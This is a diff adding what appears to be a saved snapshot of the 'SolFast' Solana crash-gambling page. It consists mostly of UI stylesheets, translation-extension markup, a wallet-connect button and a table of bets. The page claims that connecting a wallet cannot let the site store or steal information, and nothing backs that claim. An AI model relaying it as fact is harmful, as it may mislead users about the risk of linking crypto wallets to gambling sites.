@@ -1,0 +1,2241 @@
+<html lang="en">
+
+<head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;family=Roboto+Mono:wght@700&amp;display=swap"
+    rel="stylesheet">
+  <meta charset="utf-8">
+  <link rel="icon" href="/favicon.ico">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="theme-color" content="#000000">
+  <meta name="description" content="Web site created using create-react-app">
+  <link rel="apple-touch-icon" href="/logo192.png">
+  <link rel="manifest" href="/manifest.json">
+  <title>SolFast</title>
+  <script defer="defer" src="/static/js/main.39d8851f.js"></script>
+  <link href="/static/css/main.99e164e4.css" rel="stylesheet">
+  <link href="https://app.openlogin.com/start" crossorigin="anonymous" type="text/html" rel="prefetch">
+  <link href="https://app.openlogin.com/sdk-modal" crossorigin="anonymous" type="text/html" rel="prefetch">
+  <style data-styled="active" data-styled-version="5.3.1"></style>
+  <style data-jss="" data-meta="MuiTouchRipple">
+    .MuiTouchRipple-root {
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 0;
+      overflow: hidden;
+      position: absolute;
+      border-radius: inherit;
+      pointer-events: none;
+    }
+
+    .MuiTouchRipple-ripple {
+      opacity: 0;
+      position: absolute;
+    }
+
+    .MuiTouchRipple-rippleVisible {
+      opacity: 0.3;
+      animation: MuiTouchRipple-keyframes-enter 550ms cubic-bezier(0.4, 0, 0.2, 1);
+      transform: scale(1);
+    }
+
+    .MuiTouchRipple-ripplePulsate {
+      animation-duration: 200ms;
+    }
+
+    .MuiTouchRipple-child {
+      width: 100%;
+      height: 100%;
+      display: block;
+      opacity: 1;
+      border-radius: 50%;
+      background-color: currentColor;
+    }
+
+    .MuiTouchRipple-childLeaving {
+      opacity: 0;
+      animation: MuiTouchRipple-keyframes-exit 550ms cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .MuiTouchRipple-childPulsate {
+      top: 0;
+      left: 0;
+      position: absolute;
+      animation: MuiTouchRipple-keyframes-pulsate 2500ms cubic-bezier(0.4, 0, 0.2, 1) 200ms infinite;
+    }
+
+    @-webkit-keyframes MuiTouchRipple-keyframes-enter {
+      0% {
+        opacity: 0.1;
+        transform: scale(0);
+      }
+
+      100% {
+        opacity: 0.3;
+        transform: scale(1);
+      }
+    }
+
+    @-webkit-keyframes MuiTouchRipple-keyframes-exit {
+      0% {
+        opacity: 1;
+      }
+
+      100% {
+        opacity: 0;
+      }
+    }
+
+    @-webkit-keyframes MuiTouchRipple-keyframes-pulsate {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(0.92);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+  </style>
+  <style data-jss="" data-meta="MuiButtonBase">
+    .MuiButtonBase-root {
+      color: inherit;
+      border: 0;
+      cursor: pointer;
+      margin: 0;
+      display: inline-flex;
+      outline: 0;
+      padding: 0;
+      position: relative;
+      align-items: center;
+      user-select: none;
+      border-radius: 0;
+      vertical-align: middle;
+      -moz-appearance: none;
+      justify-content: center;
+      text-decoration: none;
+      background-color: transparent;
+      -webkit-appearance: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .MuiButtonBase-root::-moz-focus-inner {
+      border-style: none;
+    }
+
+    .MuiButtonBase-root.Mui-disabled {
+      cursor: default;
+      pointer-events: none;
+    }
+
+    @media print {
+      .MuiButtonBase-root {
+        -webkit-print-color-adjust: exact;
+      }
+    }
+  </style>
+  <style data-jss="" data-meta="MuiButton">
+    .MuiButton-root {
+      color: #fff;
+      padding: 12px 16px;
+      font-size: 0.875rem;
+      min-width: 64px;
+      box-sizing: border-box;
+      transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+      font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+      font-weight: 500;
+      line-height: 1.75;
+      border-radius: 4px;
+      letter-spacing: 0.02857em;
+    }
+
+    .MuiButton-root:hover {
+      text-decoration: none;
+      background-color: rgba(255, 255, 255, 0.08);
+    }
+
+    .MuiButton-root.Mui-disabled {
+      color: rgba(255, 255, 255, 0.3);
+    }
+
+    @media (hover: none) {
+      .MuiButton-root:hover {
+        background-color: transparent;
+      }
+    }
+
+    .MuiButton-root:hover.Mui-disabled {
+      background-color: transparent;
+    }
+
+    .MuiButton-label {
+      width: 100%;
+      display: inherit;
+      align-items: inherit;
+      white-space: nowrap;
+      justify-content: inherit;
+    }
+
+    .MuiButton-text {
+      padding: 6px 8px;
+    }
+
+    .MuiButton-textPrimary {
+      color: #3f51b5;
+    }
+
+    .MuiButton-textPrimary:hover {
+      background-color: rgba(63, 81, 181, 0.08);
+    }
+
+    @media (hover: none) {
+      .MuiButton-textPrimary:hover {
+        background-color: transparent;
+      }
+    }
+
+    .MuiButton-textSecondary {
+      color: #f50057;
+    }
+
+    .MuiButton-textSecondary:hover {
+      background-color: rgba(245, 0, 87, 0.08);
+    }
+
+    @media (hover: none) {
+      .MuiButton-textSecondary:hover {
+        background-color: transparent;
+      }
+    }
+
+    .MuiButton-outlined {
+      border: 1px solid rgba(255, 255, 255, 0.23);
+      padding: 5px 15px;
+    }
+
+    .MuiButton-outlined.Mui-disabled {
+      border: 1px solid rgba(255, 255, 255, 0.12);
+    }
+
+    .MuiButton-outlinedPrimary {
+      color: #3f51b5;
+      border: 1px solid rgba(63, 81, 181, 0.5);
+    }
+
+    .MuiButton-outlinedPrimary:hover {
+      border: 1px solid #3f51b5;
+      background-color: rgba(63, 81, 181, 0.08);
+    }
+
+    @media (hover: none) {
+      .MuiButton-outlinedPrimary:hover {
+        background-color: transparent;
+      }
+    }
+
+    .MuiButton-contained {
+      color: rgba(0, 0, 0, 0.87);
+      box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
+      background-color: #e0e0e0;
+    }
+
+    .MuiButton-contained:hover {
+      box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
+      background-color: #d5d5d5;
+    }
+
+    .MuiButton-contained.Mui-focusVisible {
+      box-shadow: 0px 3px 5px -1px rgba(0, 0, 0, 0.2), 0px 6px 10px 0px rgba(0, 0, 0, 0.14), 0px 1px 18px 0px rgba(0, 0, 0, 0.12);
+    }
+
+    .MuiButton-contained:active {
+      box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12);
+    }
+
+    .MuiButton-contained.Mui-disabled {
+      color: rgba(255, 255, 255, 0.3);
+      box-shadow: none;
+      background-color: rgba(255, 255, 255, 0.12);
+    }
+
+    @media (hover: none) {
+      .MuiButton-contained:hover {
+        box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
+        background-color: #e0e0e0;
+      }
+    }
+
+    .MuiButton-contained:hover.Mui-disabled {
+      background-color: rgba(255, 255, 255, 0.12);
+    }
+
+    .MuiButton-containedPrimary {
+      color: #fff;
+      background-color: #3f51b5;
+    }
+
+    .MuiButton-containedPrimary:hover {
+      background-color: #303f9f;
+    }
+
+    @media (hover: none) {
+      .MuiButton-containedPrimary:hover {
+        background-color: #3f51b5;
+      }
+    }
+
+    .MuiButton-disableElevation {
+      box-shadow: none;
+    }
+
+    .MuiButton-disableElevation:hover {
+      box-shadow: none;
+    }
+
+    .MuiButton-disableElevation.Mui-focusVisible {
+      box-shadow: none;
+    }
+
+    .MuiButton-disableElevation:active {
+      box-shadow: none;
+    }
+
+    .MuiButton-disableElevation.Mui-disabled {
+      box-shadow: none;
+    }
+
+    .MuiButton-colorInherit {
+      color: inherit;
+      border-color: currentColor;
+    }
+
+    .MuiButton-textSizeSmall {
+      padding: 4px 5px;
+      font-size: 0.8125rem;
+    }
+
+    .MuiButton-textSizeLarge {
+      padding: 8px 11px;
+      font-size: 0.9375rem;
+    }
+
+    .MuiButton-outlinedSizeSmall {
+      padding: 3px 9px;
+      font-size: 0.8125rem;
+    }
+
+    .MuiButton-outlinedSizeLarge {
+      padding: 7px 21px;
+      font-size: 0.9375rem;
+    }
+
+    .MuiButton-containedSizeSmall {
+      padding: 4px 10px;
+      font-size: 0.8125rem;
+    }
+
+    .MuiButton-containedSizeLarge {
+      padding: 8px 22px;
+      font-size: 0.9375rem;
+    }
+
+    .MuiButton-fullWidth {
+      width: 100%;
+    }
+
+    .MuiButton-startIcon {
+      display: inherit;
+      margin-left: -4px;
+      margin-right: 20px;
+    }
+
+    .MuiButton-startIcon.MuiButton-iconSizeSmall {
+      margin-left: -2px;
+    }
+
+    .MuiButton-endIcon {
+      display: inherit;
+      margin-left: 20px;
+      margin-right: -4px;
+    }
+
+    .MuiButton-endIcon.MuiButton-iconSizeSmall {
+      margin-right: -2px;
+    }
+
+    .MuiButton-iconSizeSmall>*:first-child {
+      font-size: 18px;
+    }
+
+    .MuiButton-iconSizeMedium>*:first-child {
+      font-size: 20px;
+    }
+
+    .MuiButton-iconSizeLarge>*:first-child {
+      font-size: 22px;
+    }
+  </style>
+  <style data-jss="" data-meta="MuiSnackbar">
+    .MuiSnackbar-root {
+      left: 8px;
+      right: 8px;
+      display: flex;
+      z-index: 1400;
+      position: fixed;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .MuiSnackbar-anchorOriginTopCenter {
+      top: 8px;
+    }
+
+    @media (min-width:600px) {
+      .MuiSnackbar-anchorOriginTopCenter {
+        top: 24px;
+        left: 50%;
+        right: auto;
+        transform: translateX(-50%);
+      }
+    }
+
+    .MuiSnackbar-anchorOriginBottomCenter {
+      bottom: 8px;
+    }
+
+    @media (min-width:600px) {
+      .MuiSnackbar-anchorOriginBottomCenter {
+        left: 50%;
+        right: auto;
+        bottom: 24px;
+        transform: translateX(-50%);
+      }
+    }
+
+    .MuiSnackbar-anchorOriginTopRight {
+      top: 8px;
+      justify-content: flex-end;
+    }
+
+    @media (min-width:600px) {
+      .MuiSnackbar-anchorOriginTopRight {
+        top: 24px;
+        left: auto;
+        right: 24px;
+      }
+    }
+
+    .MuiSnackbar-anchorOriginBottomRight {
+      bottom: 8px;
+      justify-content: flex-end;
+    }
+
+    @media (min-width:600px) {
+      .MuiSnackbar-anchorOriginBottomRight {
+        left: auto;
+        right: 24px;
+        bottom: 24px;
+      }
+    }
+
+    .MuiSnackbar-anchorOriginTopLeft {
+      top: 8px;
+      justify-content: flex-start;
+    }
+
+    @media (min-width:600px) {
+      .MuiSnackbar-anchorOriginTopLeft {
+        top: 24px;
+        left: 24px;
+        right: auto;
+      }
+    }
+
+    .MuiSnackbar-anchorOriginBottomLeft {
+      bottom: 8px;
+      justify-content: flex-start;
+    }
+
+    @media (min-width:600px) {
+      .MuiSnackbar-anchorOriginBottomLeft {
+        left: 24px;
+        right: auto;
+        bottom: 24px;
+      }
+    }
+  </style>
+  <style data-jss="" data-meta="MuiDialog">
+    @media print {
+      .MuiDialog-root {
+        position: absolute !important;
+      }
+    }
+
+    .MuiDialog-scrollPaper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .MuiDialog-scrollBody {
+      overflow-x: hidden;
+      overflow-y: auto;
+      text-align: center;
+    }
+
+    .MuiDialog-scrollBody:after {
+      width: 0;
+      height: 100%;
+      content: "";
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    .MuiDialog-container {
+      height: 100%;
+      outline: 0;
+    }
+
+    @media print {
+      .MuiDialog-container {
+        height: auto;
+      }
+    }
+
+    .MuiDialog-paper {
+      margin: 32px;
+      position: relative;
+      overflow-y: auto;
+    }
+
+    @media print {
+      .MuiDialog-paper {
+        box-shadow: none;
+        overflow-y: visible;
+      }
+    }
+
+    .MuiDialog-paperScrollPaper {
+      display: flex;
+      max-height: calc(100% - 64px);
+      flex-direction: column;
+    }
+
+    .MuiDialog-paperScrollBody {
+      display: inline-block;
+      text-align: left;
+      vertical-align: middle;
+    }
+
+    .MuiDialog-paperWidthFalse {
+      max-width: calc(100% - 64px);
+    }
+
+    .MuiDialog-paperWidthXs {
+      max-width: 444px;
+    }
+
+    @media (max-width:507.95px) {
+      .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
+        max-width: calc(100% - 64px);
+      }
+    }
+
+    .MuiDialog-paperWidthSm {
+      max-width: 600px;
+    }
+
+    @media (max-width:663.95px) {
+      .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
+        max-width: calc(100% - 64px);
+      }
+    }
+
+    .MuiDialog-paperWidthMd {
+      max-width: 960px;
+    }
+
+    @media (max-width:1023.95px) {
+      .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
+        max-width: calc(100% - 64px);
+      }
+    }
+
+    .MuiDialog-paperWidthLg {
+      max-width: 1280px;
+    }
+
+    @media (max-width:1343.95px) {
+      .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
+        max-width: calc(100% - 64px);
+      }
+    }
+
+    .MuiDialog-paperWidthXl {
+      max-width: 1920px;
+    }
+
+    @media (max-width:1983.95px) {
+      .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
+        max-width: calc(100% - 64px);
+      }
+    }
+
+    .MuiDialog-paperFullWidth {
+      width: calc(100% - 64px);
+    }
+
+    .MuiDialog-paperFullScreen {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      max-width: 100%;
+      max-height: none;
+      border-radius: 0;
+    }
+
+    .MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
+      margin: 0;
+      max-width: 100%;
+    }
+  </style>
+  <style data-jss="" data-meta="makeStyles">
+    .jss1 .MuiDialog-paper {
+      width: 320px;
+      margin: 0;
+    }
+
+    .jss1 .MuiDialogTitle-root {
+      background-color: #3f51b5;
+    }
+
+    .jss1 .MuiDialogContent-root {
+      padding: 0;
+    }
+
+    .jss1 .MuiDialogContent-root .MuiList-root {
+      padding: 0;
+      background: #212121;
+    }
+
+    .jss1 .MuiDialogContent-root .MuiListItem-root {
+      padding: 0;
+      box-shadow: inset 0 1px 0 0 rgba(255, 255, 255, 0.1);
+    }
+
+    .jss1 .MuiDialogContent-root .MuiListItem-root:hover {
+      box-shadow: inset 0 1px 0 0 rgba(255, 255, 255, 0.1), 0 1px 0 0 rgba(255, 255, 255, 0.05);
+    }
+
+    .jss1 .MuiDialogContent-root .MuiListItem-root .MuiButton-endIcon {
+      margin: 0;
+    }
+
+    .jss1 .MuiDialogContent-root .MuiListItem-root .MuiButton-root {
+      padding: 8px 24px;
+      flex-grow: 1;
+      font-size: 1rem;
+      font-weight: 400;
+      justify-content: space-between;
+    }
+
+    .jss1 .MuiDialogContent-root .MuiListItem-root .MuiSvgIcon-root {
+      color: #9e9e9e;
+    }
+
+    .jss1 .MuiDialogContent-root .MuiCollapse-root .MuiList-root {
+      background: #212121;
+    }
+
+    .jss1 .MuiDialogTitle-root .MuiTypography-root {
+      display: flex;
+      line-height: 40px;
+      justify-content: space-between;
+    }
+
+    .jss1 .MuiDialogTitle-root .MuiIconButton-root {
+      color: #9e9e9e;
+      padding: 8px;
+      flex-shrink: 1;
+      margin-right: -8px;
+    }
+  </style>
+  <style>
+    #tr-popup,
+    #tr-popup * {
+      all: unset;
+    }
+
+    #tr-popup {
+      font: 15px "Segoe UI", Arial, Helvetica, sans-serif;
+      color: #222;
+      padding: 24px;
+      display: block;
+      z-index: 2147483647;
+      position: absolute;
+      max-width: 400px;
+      min-width: 300px;
+      direction: ltr;
+      text-align: left;
+      background: #fff;
+      border-radius: 2px;
+      box-sizing: border-box;
+      box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.1), 0 12px 24px 0 rgba(51, 51, 51, 0.3);
+      transition: opacity, visibility;
+      transition-duration: 0.2s;
+    }
+
+    #tr-popup[data-hidden="true"] {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    #tr-popup[data-position="top"] {
+      margin-top: -12px;
+    }
+
+    #tr-popup[data-position="bottom"] {
+      margin-top: 12px;
+    }
+
+    #tr-popup .tr-popup__arrow {
+      top: 100%;
+      left: 50%;
+      width: 26px;
+      height: 12px;
+      display: block;
+      position: absolute;
+      margin-left: -13px;
+      margin-top: -1px;
+      background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNiIgaGVpZ2h0PSIxMiI+PHBhdGggZD0iTTAgMGwxMyAxMkwyNiAweiIgb3BhY2l0eT0iLjEiLz48cGF0aCBkPSJNMSAwbDEyIDExTDI1IDB6IiBmaWxsPSIjZmZmIi8+PC9zdmc+") no-repeat;
+    }
+
+    #tr-popup[data-position="bottom"] .tr-popup__arrow {
+      top: auto;
+      bottom: 100%;
+      margin-bottom: -1px;
+      transform: rotate(180deg);
+    }
+
+    #tr-popup .tr-popup__value,
+    #tr-popup .tr-popup__block {
+      word-wrap: break-word;
+      white-space: pre-wrap;
+    }
+
+    [data-type="trSpan"][data-translated="true"][data-source-lang="ja"],
+    [data-type="trSpan"][data-translated="true"][data-source-lang="zh"],
+    #tr-popup .tr-popup__title_original,
+    #tr-popup .tr-popup__block_a,
+    #tr-popup .tr-popup__block_b,
+    #tr-popup .tr-popup__button {
+      font-family: "Segoe UI", Arial, Helvetica, sans-serif !important;
+    }
+
+    #tr-popup .tr-popup__title_original {
+      font-weight: bold;
+    }
+
+    #tr-popup .tr-popup__block {
+      display: block;
+    }
+
+    #tr-popup .tr-popup__link {
+      cursor: pointer;
+      -webkit-user-select: none;
+      user-select: none;
+    }
+
+    #tr-popup .tr-popup__link_suggest {
+      color: #1378d7;
+      font-size: 13px;
+      line-height: 18px;
+      margin-right: 22px;
+    }
+
+    #tr-popup .tr-popup__link_suggest:hover,
+    #tr-popup .tr-popup__link_suggest:active {
+      color: #000;
+    }
+
+    #tr-popup .tr-popup__logo {
+      height: 18px;
+      opacity: 0.3;
+      display: inline-block;
+      transition: opacity 0.2s;
+      vertical-align: top;
+    }
+
+    #tr-popup .tr-popup__logo_company {
+      width: 34px;
+      filter: brightness(0);
+      background: url("https://yastatic.net/s3/trbro/v20.5.1.0/i/service_logo.svg");
+      background-size: 34px;
+      background-position: 0 -18px;
+    }
+
+    #tr-popup[lang="ru"] .tr-popup__logo_company {
+      background-position: 0 0;
+    }
+
+    #tr-popup .tr-popup__logo_service {
+      width: 42px;
+      background: url("https://yastatic.net/s3/trbro/v20.5.1.0/i/service_name.svg");
+      margin-left: 2px;
+      background-size: 63px;
+      background-position: 0 -18px;
+    }
+
+    #tr-popup[lang="ru"] .tr-popup__logo_service {
+      width: 57px;
+      background-position: 0 0;
+    }
+
+    #tr-popup[lang="uk"] .tr-popup__logo_service {
+      width: 56px;
+      background-position: 0 -36px;
+    }
+
+    #tr-popup[lang="tr"] .tr-popup__logo_service {
+      width: 25px;
+      background-position: 0 -54px;
+    }
+
+    #tr-popup .tr-popup__link_service:hover .tr-popup__logo {
+      opacity: 0.6;
+    }
+
+    #tr-popup .tr-popup__input {
+      width: 100%;
+      height: 80px;
+      resize: none;
+      border: 2px solid #e5e5e5;
+      padding: 8px;
+      display: block;
+      font-size: 15px;
+      box-sizing: border-box;
+      border-radius: 2px;
+    }
+
+    #tr-popup .tr-popup__input:focus {
+      border-color: #bbb;
+    }
+
+    #tr-popup .tr-popup__block_a,
+    #tr-popup .tr-popup__block_b {
+      margin-top: 16px;
+    }
+
+    #tr-popup .tr-popup__block_a {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    #tr-popup .tr-popup__block_b {
+      position: relative;
+    }
+
+    #tr-popup .tr-popup__block_submit {
+      text-align: right;
+      margin-top: 24px;
+    }
+
+    #tr-popup .tr-popup__overlay {
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      position: absolute;
+    }
+
+    #tr-popup .tr-popup__overlay_submitted {
+      color: #999;
+      z-index: 1;
+      display: flex;
+      background: #fff;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #tr-popup:not([data-expanded="true"]) .tr-popup__block_b,
+    #tr-popup:not([data-submitted="true"]) .tr-popup__overlay_submitted {
+      display: none;
+    }
+
+    #tr-popup .tr-popup__menu {
+      font-size: 13px;
+      opacity: 0;
+      visibility: hidden;
+      white-space: nowrap;
+      position: absolute;
+      bottom: 100%;
+      margin-bottom: 8px;
+      padding: 4px 14px;
+      z-index: 1;
+      background-color: #f5f5f5;
+      border: 1px solid #bbb;
+      border-radius: 2px;
+      box-shadow: 0px 0 0 1px rgba(0, 0, 0, 0.1), 0 8px 14px 0 rgba(51, 51, 51, 0.3);
+    }
+
+    #tr-popup[data-menu-position="left"] .tr-popup__menu {
+      right: 0;
+    }
+
+    #tr-popup[data-menu="true"] .tr-popup__menu {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    #tr-popup .tr-popup__menu:hover {
+      background-color: #efefef;
+    }
+
+    #tr-popup .tr-popup__button {
+      cursor: pointer;
+      display: inline-block;
+      -webkit-user-select: none;
+      user-select: none;
+    }
+
+    #tr-popup .tr-popup__button_menu,
+    #tr-popup .tr-popup__button_close {
+      top: 4px;
+      width: 20px;
+      height: 20px;
+      opacity: 0.3;
+      position: absolute;
+    }
+
+    #tr-popup .tr-popup__button_close {
+      right: 4px;
+      background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCI+PHBhdGggZD0iTTkuMjkzIDEwTDYuMTQ2IDYuODU0YS41LjUgMCAxIDEgLjcwOC0uNzA4TDEwIDkuMjkzbDMuMTQ2LTMuMTQ3YS41LjUgMCAwIDEgLjcwOC43MDhMMTAuNzA3IDEwbDMuMTQ3IDMuMTQ2YS41LjUgMCAwIDEtLjcwOC43MDhMMTAgMTAuNzA3bC0zLjE0NiAzLjE0N2EuNS41IDAgMCAxLS43MDgtLjcwOEw5LjI5MyAxMHoiLz48L3N2Zz4=");
+    }
+
+    #tr-popup .tr-popup__button_menu {
+      right: 24px;
+      background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMjAiIHdpZHRoPSIyMCI+PHBhdGggZD0ibTUgNnYxaDEwdi0xaC0xMHptMCAzdjFoMTB2LTFoLTEwem0wIDN2MWgxMHYtMWgtMTB6Ii8+PC9zdmc+");
+    }
+
+    #tr-popup .tr-popup__button_menu:hover,
+    #tr-popup .tr-popup__button_close:hover {
+      opacity: 0.5;
+    }
+
+    #tr-popup .tr-popup__button_close:active {
+      opacity: 0.6;
+    }
+
+    #tr-popup[data-menu="true"] .tr-popup__button_menu {
+      opacity: 1;
+    }
+
+    #tr-popup .tr-popup__button_submit {
+      color: #000;
+      height: 28px;
+      padding: 0 16px;
+      font-size: 13px;
+      min-width: 112px;
+      background: #fc0;
+      box-sizing: border-box;
+      text-align: center;
+      line-height: 28px;
+      border-radius: 2px;
+    }
+
+    #tr-popup .tr-popup__button_submit:hover {
+      background: #ffb800;
+    }
+
+    #tr-popup .tr-popup__button_submit:active {
+      background: #ffa400;
+    }
+
+    #tr-popup[data-invalid="true"] .tr-popup__button_submit {
+      color: rgba(0, 0, 0, 0.5);
+      cursor: default;
+      background: rgba(0, 0, 0, 0.1);
+    }
+
+    [data-type="trSpan"][data-selected="true"] {
+      color: #222 !important;
+      background: #cce4f7 !important;
+    }
+
+    [data-type="trSpan"] {
+      font-size: inherit !important;
+    }
+  </style>
+  <script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script>
+  <style data-emotion="css" data-s=""></style>
+</head>
+
+<body>
+  <div id="rot">
+    <div class="App">
+      <header class="header">
+        <div class="header__container">
+          <nav class="header__nav">
+            <ul class="header__links">
+              <li class="header__logo"><a href="/">
+                  <ya-tr-span data-index="0-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                    data-value="Sol" data-translation="Солфаст" data-ch="0" data-type="trSpan">Sol</ya-tr-span><span
+                    class="green"></span>
+                </a></li>
+              <li class="header__link"><a href="/play">
+                  <ya-tr-span data-index="1-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                    data-value="Play" data-translation="Воспроизвести" data-ch="0" data-type="trSpan">Play</ya-tr-span>
+                </a></li>
+              <li class="header__link"><a href="/leaderboards">
+                  <ya-tr-span data-index="2-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                    data-value="Leaderboards" data-translation="Таблицы лидеров" data-ch="0" data-type="trSpan">
+                    Leaderboards</ya-tr-span>
+                </a></li>
+              <li class="header__link"><a href="/statistics">
+                  <ya-tr-span data-index="3-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                    data-value="Statistics" data-translation="Статистика" data-ch="0" data-type="trSpan">Statistics
+                  </ya-tr-span>
+                </a></li>
+              <li class="header__link"><a href="/FAQ">
+                  <ya-tr-span data-index="4-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                    data-value="FAQ" data-translation="Вопросы и ответы" data-ch="0" data-type="trSpan">FAQ</ya-tr-span>
+                </a></li>
+            </ul>
+          </nav>
+        </div>
+      </header>
+      <main class="main">
+        <div class="play">
+          <div class="play__container">
+            <div class="game__container">
+              <div class="play__game game">
+                <div class="game__timer timer">
+                  <div class="timer__value" style="display: block;">Next round in: 2.9s</div>
+                  <div class="timer__display" style="width: 30%;"></div>
+                </div>
+                <div class="game__crash"><span style="color: red;">CRASHED 3.27x</span></div><canvas width="400"
+                  height="250"></canvas>
+              </div>
+              <div class="gamepad"><button class="trigger">Connect to play!</button>
+                <div class="gamepad__description">There is no way for solfast to store or steal information from the
+                  connection of your wallet, it is only used to keep track of playing data and giving you the ability to
+                  withdraw and deposit</div>
+              </div>
+              <div class="play__bets bets">
+                <div class="bets__container">
+                  <table class="bets__table">
+                    <tr class="bets__header bets-header">
+                      <td class="bets-header__item item-1">User</td>
+                      <td class="bets-header__item item-2">Bet</td>
+                      <td class="bets-header__item item-3">Multiplier</td>
+                      <td class="bets-header__item item-4">Profit</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (4ZJg...fkes)</td>
+                      <td class="bets__item item-2">0.0734 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">BRIBRI0951</td>
+                      <td class="bets__item item-2">0.0353 SOL</td>
+                      <td class="bets__item item-3">2.41x</td>
+                      <td class="bets__item item-4">0.0498 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (4ZJg...fkes)</td>
+                      <td class="bets__item item-2">0.0241 SOL</td>
+                      <td class="bets__item item-3">2.41x</td>
+                      <td class="bets__item item-4">0.0340 SOL</td>
+                    </tr>
+                    <tr class="bets__loose bets__2">
+                      <td class="bets__item item-1">Tom Hopkins</td>
+                      <td class="bets__item item-2">0.0241 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (AXke...YDWq)</td>
+                      <td class="bets__item item-2">0.0357 SOL</td>
+                      <td class="bets__item item-3">1.39x</td>
+                      <td class="bets__item item-4">0.0139 SOL</td>
+                    </tr>
+                    <tr class="bets__win bets__2">
+                      <td class="bets__item item-1">Wallet (Z1bn...NZwD)</td>
+                      <td class="bets__item item-2">0.0241 SOL</td>
+                      <td class="bets__item item-3">3x</td>
+                      <td class="bets__item item-4">0.0482 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (J3DG...7Tik)</td>
+                      <td class="bets__item item-2">0.0770 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (HSyx...PUCF)</td>
+                      <td class="bets__item item-2">0.0427 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__loose bets__1">
+                      <td class="bets__item item-1">Alex</td>
+                      <td class="bets__item item-2">0.0241 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (BLrQ...zsMH)</td>
+                      <td class="bets__item item-2">0.0749 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__loose bets__1">
+                      <td class="bets__item item-1">Wallet (2C88...WDFP)</td>
+                      <td class="bets__item item-2">0.0739 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__loose bets__2">
+                      <td class="bets__item item-1">Wallet (DUkK...9fzp)</td>
+                      <td class="bets__item item-2">0.0626 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
